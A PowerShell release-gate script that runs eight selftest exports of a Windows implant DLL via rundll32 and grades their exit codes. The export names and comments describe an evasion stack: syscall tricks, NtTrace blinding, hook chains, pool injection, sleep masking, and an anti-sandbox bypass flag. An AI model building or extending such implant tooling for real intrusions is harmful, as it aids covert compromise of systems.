# selftest_gate.ps1 — release-blocking selftest regression on the 8 core
# nyx_selftest_* exports, run against the selftest DLL produced by
# build_selftest_dll.ps1.
#
# Mirrors the "Selftest regression (evasion stack)" step of
# .github/workflows/windows-ci.yml with the following deltas:
#   - Uses the renamed selftest DLL (nyx_implant_win_selftest.dll), not the
#     default prod-and-selftest-same-name DLL the CI step uses.
#   - Exports per-test results to staging/selftest_results.csv (artifact for
#     post-failure diagnosis — spec §9 "Inspect selftest_results.csv artifact").
#   - Same 8 exports, same per-export timeout, same sentinel semantics.
#
# Sentinel semantics (from windows-ci.yml + crates/implant-win selftests.rs):
#   - Exit code 0xFFFFFFFF (-1) = harness bootstrap failure (selftests.rs:5).
#   - Exit code 0xFFFFFFFE (-2) = RT bootstrap failure (selftests.rs:42).
#   - Any OTHER nonzero value = a real bitmask the test produced = "ran".
#   - Exit code 0                = real failure (the test's own "nothing passed").
#   - TIMEOUT (25s)              = hard fail (matches CI).
# Passing the gate = NO test hit a sentinel, exited 0, or timed out. A test that
# ran and returned a non-sentinel nonzero bitmask is a PASS (it exercised the
# code path and reported what it found).
#
# NOTE: nyx_selftest_foliage / nyx_selftest_foliage_apc are deliberately absent
# (Foliage APC chain is dead code, superseded by Fluctuation — see CHANGELOG
# 0.2.0 and selftests.rs:2473-2474). Do NOT re-add them: rundll32 would emit
# "missing entry" and exit 0, which our 0=fail rule would flag as a failure.
#
# Assumes CWD = repo root. PowerShell 5.1.
$ErrorActionPreference = 'Stop'

$dll = 'crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win_selftest.dll'
if (-not (Test-Path $dll)) {
    Write-Host "::error::selftest DLL not found at $dll — run build_selftest_dll.ps1 first."
    exit 1
}
$dllDir = Split-Path $dll

# The 8 core evasion-stack exports (exact list from windows-ci.yml).
$tests = @(
    'nyx_selftest',
    'nyx_selftest_postex',
    'nyx_selftest_evasion',
    'nyx_selftest_syscall_rt',
    'nyx_selftest_blind_nttrace',
    'nyx_selftest_hookchain',
    'nyx_selftest_inject_pool',
    'nyx_selftest_lacuna'
)

# staging/ is created by stage_assets.ps1 later, but we write our CSV there now
# (the dir may not exist yet on the first release run — create it).
$stagingDir = 'staging'
if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }
$csvOut = Join-Path $stagingDir 'selftest_results.csv'

# The implant's anti-sandbox suite (envprobe + antidebug) may flag the host as a
# VM and short-circuit the selftests. NYX_SKIP_SANDBOX=1 bypasses that gate so
# the tests actually execute. Same env as windows-ci.yml.
$env:NYX_SKIP_SANDBOX = '1'

# Per-export timeout: 25s in windows-ci.yml. Spec §4 says 20s/export; we use the
# CI value (25s) because that is the empirically-tuned budget that lets the
# slowest export (nyx_selftest_blind_nttrace) complete on 17763 without false
# TIMEOUTs. Using 20s would reintroduce flaky TIMEOUTs the CI already fixed.
$timeoutMs = 25000

Write-Host 'Test                              Exit       Bits'
Write-Host '--------------------------------- ---------- --------------------------------'
$results = [System.Collections.Generic.List[object]]::new()
$failed = @()
$i = 0
foreach ($t in $tests) {
    $i++
    $code = $null
    $status = 'UNKNOWN'
    $bits = ''
    $p = Start-Process rundll32.exe -ArgumentList "$dll,$t" -PassThru -WindowStyle Hidden -WorkingDirectory $dllDir
    $p.WaitForExit($timeoutMs) | Out-Null
    if ($p.HasExited) {
        $code = $p.ExitCode
        $status = 'EXIT'
        if ($code -ge 0) {
            $bits = [Convert]::ToString($code, 2)
        } else {
            # Negative int = sentinel. Format as hex for readability.
            $bits = '0x{0:X8}' -f ($code -band 0xFFFFFFFF)
        }
        Write-Host ('{0,-33} {1,10} {2}' -f $t, $code, $bits)
        # Sentinel = bootstrap failure (treat as hard fail). 0 = real failure.
        # Any other nonzero = real bitmask = PASS.
        if ($code -eq -1 -or $code -eq -2 -or $code -eq 0) {
            $tag = if ($code -eq 0) { 'ZERO' } else { 'SENTINEL' }
            $failed += ('{0}=0x{1:X8} ({2})' -f $t, ($code -band 0xFFFFFFFF), $tag)
            $status = $tag
        } else {
            $status = 'PASS'
        }
    } else {
        try { $p.Kill() } catch {}
        Write-Host ('{0,-33} TIMEOUT' -f $t)
        $failed += "$t=TIMEOUT"
        $status = 'TIMEOUT'
    }
    $results.Add([PSCustomObject]@{
        export = $t
        exit_code = $code
        status = $status
        bits = $bits
    })
}

# Write CSV for the release artifact (debugging aid when the gate fails).
$results | Export-Csv -Path $csvOut -NoTypeInformation -Encoding UTF8
Write-Host "Selftest CSV -> $csvOut"

if ($failed.Count -gt 0) {
    Write-Host '::error::selftest gate failures:'
    foreach ($f in $failed) { Write-Host "  - $f" }
    Write-Host '::error::inspect staging/selftest_results.csv for per-export detail.'
    exit 1
}
Write-Host ("::notice::selftest gate PASS: all {0} core exports ran without sentinel/zero/timeout failures" -f $tests.Count)
